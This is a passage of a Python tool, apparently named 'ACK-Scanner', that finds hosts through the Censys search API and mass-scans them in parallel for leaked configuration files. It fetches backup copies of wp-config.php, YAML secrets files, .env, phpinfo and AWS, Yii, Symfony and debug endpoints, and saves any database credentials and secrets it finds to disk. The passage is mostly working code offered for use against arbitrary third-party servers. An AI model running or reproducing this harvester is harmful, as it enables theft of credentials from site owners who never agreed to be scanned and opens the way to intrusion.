'wordpress/wp-config.phpnew', 'wordpress/wp-config.phpold', 'wordpress/wp-config.phporiginal', 'wordpress/wp-config.phptmp', 'wordpress/wp-config.prod.php.txt', 'wordpress/wp-config.save', 'wordpress/wp-config.tar', 'wordpress/wp-config.temp', 'wordpress/wp-config.txt', 'wordpress/wp-config.zip', 'wordpress/wp-config~', 'wordpress/wp-configbak']
        for path in configphpPathlist:
            url_ = self.rebuild_url(path)
            try:
                resp = session.get(url_, timeout=10, verify=False).text
                if 'The base configuration for WordPress' in resp or 'WordPress database table prefix' in resp or 'table_prefix' in resp or 'wp-settings.php' in resp:
                    print(self.url + ' -> FOUND WP CONFIG')
                    self.saveTofile('php_config.txt', resp, url_)
                    break
                else:
                    if path == configphpPathlist[-1]:
                        print(self.url + ' -> NOT FOUND WP CONFIG')
            except:
                pass

    def config_yaml(self):
        configyamlPathlist = ['app/config.yml', 'app/config/parameters.yml', 'config/secrets.yml',
                            'secrets.yml', 'database.yml']
        for path in configyamlPathlist:
            url_ = self.rebuild_url(path)
            try:
                resp = session.get(url_, timeout=10, verify=False).text
                if re.search('database_host|database_name|db_name|db_host', resp, re.IGNORECASE):
                    print(self.url + ' -> FOUND YAML CONFIG')
                    self.saveTofile('yaml_config.txt', resp, url_)
                    break
                else:
                    if path == configyamlPathlist[-1]:
                        print(self.url + ' -> NOT FOUND YAML CONFIG')
            except:
                pass

def start_(url, foldersave):
    if '://' not in url:
        url = 'http://' + url
    try:
        session.get(url, timeout=7, verify=False)
        main = Main(url, foldersave)
        main.phpinfo()
        main.config_json()
        main.env()
        main.config_php()
        main.aws()
        main.yii()
        main.debug()
        main.symfony()
        main.config_js()
        main.config_yaml()
    except:
        print(url + ' -> ERROR')


def censys_search(api_id, api_secret, query, max_pages=10):
    url = "https://search.censys.io/api/v2/hosts/search"
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json"
    }
    data = {
        "q": query,
        "per_page": 100
    }
    results = []
    for page in range(1, max_pages + 1):
        data["page"] = page
        response = requests.post(url, headers=headers, json=data, auth=(api_id, api_secret))
        if response.status_code == 200:
            json_data = response.json()
            results.extend(json_data.get('result', {}).get('hits', []))
            if len(json_data.get('result', {}).get('hits', [])) < 100:
                break
        else:
            print(f"Error fetching data from Censys on page {page}")
            break
    return results


def main_(stdscr):
    curses.curs_set(0)
    stdscr.clear()
    stdscr.addstr(0, 0, "ACK-Scanner v1.0")
    stdscr.addstr(1, 0, "1. New Censys search & scan")
    stdscr.addstr(2, 0, "2. Scan existing list of IPs")
    stdscr.addstr(3, 0, "Choose an option: ")
    curses.echo()
    choice = stdscr.getstr(3, 18, 1).decode('utf-8')

    if choice == '1':
        stdscr.addstr(4, 0, "Enter Censys API ID: ")
        api_id = stdscr.getstr(4, 20, 60).decode('utf-8')
        stdscr.addstr(5, 0, "Enter Censys API Secret: ")
        api_secret = stdscr.getstr(5, 24, 60).decode('utf-8')
        stdscr.addstr(6, 0, "Enter Censys Query: ")
        query = stdscr.getstr(6, 20, 60).decode('utf-8')
        stdscr.addstr(7, 0, "Fetching data from Censys...")
        stdscr.refresh()

        censys_data = censys_search(api_id, api_secret, query)
        if censys_data:
            with open('ips.json', 'w') as f:
                json.dump({"ips": censys_data}, f, indent=4)
            ips = [result['ip'] for result in censys_data]
            with open('ips.txt', 'w') as f:
                for ip in ips:
                    f.write(ip + '\n')

            stdscr.addstr(8, 0, "Data saved to ips.json and ips.txt")
        else:
            stdscr.addstr(8, 0, "Failed to fetch data from Censys.")
            stdscr.addstr(9, 0, "Press any key to exit...")
            stdscr.refresh()
            stdscr.getch()
            return

    elif choice == '2':
        stdscr.addstr(4, 0, "Enter filename (ending in .txt): ")
        filename = stdscr.getstr(4, 34, 60).decode('utf-8')
        try:
            with open(filename, 'r') as f:
                ips = f.read().splitlines()
        except FileNotFoundError:
            stdscr.addstr(5, 0, f"{filename} not found.")
            stdscr.addstr(6, 0, "Press any key to exit...")
            stdscr.refresh()
            stdscr.getch()
            return

    else:
        stdscr.addstr(5, 0, "Invalid choice.")
        stdscr.addstr(6, 0, "Press any key to exit...")
        stdscr.refresh()
        stdscr.getch()
        return

    stdscr.addstr(9, 0, "Running scanner on IPs...")
    stdscr.refresh()

    cpu_count = mp.cpu_count()
    thrit = cpu_count * 5
    folder = 'results'
    if not os.path.isdir(folder):
        os.makedirs(folder)
    pool = mp.Pool(thrit)
    pool.map_async(partial(start_, foldersave=folder), ips)
    pool.close()

    # Progress indicator
    while pool._state == 'RUN':
        stdscr.addstr(10, 0, "Scanning in progress... Please wait.")
        stdscr.refresh()
        time.sleep(0.5)
        stdscr.addstr(10, 0, "                              ")
        stdscr.refresh()
        time.sleep(0.5)

    pool.join()

    stdscr.addstr(10, 0, "Scanning complete. Results saved in 'results' folder.")
    stdscr.addstr(11, 0, "Press any key to exit...")
    stdscr.refresh()
    stdscr.getch()


if __name__ == '__main__':
    curses.wrapper(main_)
